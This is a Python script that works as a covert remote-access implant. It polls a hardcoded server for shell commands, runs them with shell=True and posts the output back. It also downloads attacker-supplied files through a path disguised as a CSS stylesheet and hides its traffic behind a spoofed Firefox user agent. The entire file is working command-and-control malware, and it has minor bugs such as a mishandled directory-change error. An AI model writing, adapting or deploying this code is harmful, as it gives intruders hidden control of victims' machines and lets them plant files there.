import requests
import time
import subprocess
import os

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {e.output.decode('utf-8')}"

def save_file(file_name, file_content):
    with open(file_name, "wb") as file:
        file.write(file_content)

server_url = "http://10.70.0.68:80"  # Replace <server_ip> with the actual IP of the server
backoff_time = 5

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
}

post_headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
}

while True:
    try:
        # Poll the server for a command
        response = requests.get(f"{server_url}/", headers=headers)
        command_data = response.json()
        command = command_data.get("command", "none")

        if command == "none":
            time.sleep(backoff_time)
            backoff_time = min(backoff_time * 2, 60)
            continue
        
        backoff_time = 5

        if command.startswith('cd '):
            path = command.strip('cd ').strip()
            try:
                os.chdir(path)
                output = f"Changed directory to {os.getcwd()}"
            except FileNotFoundError as e:
                    result = str(e)
        else:
            # Execute the received command
            output = execute_command(command)

        # Send the result back to the server
        requests.post(f"{server_url}/", json={"output": output}, headers=post_headers)

        response = requests.get(f"{server_url}/css/style-normal.min.css", headers=headers)
        if response.status_code == 200:
            file_data = response.content
            file_name = response.headers['Content-Disposition'].split('filename=')[-1].strip('"')
            with open(file_name, 'wb') as f:
                f.write(file_data)

    except Exception as e:
        time.sleep(5)  # Retry after 5 seconds
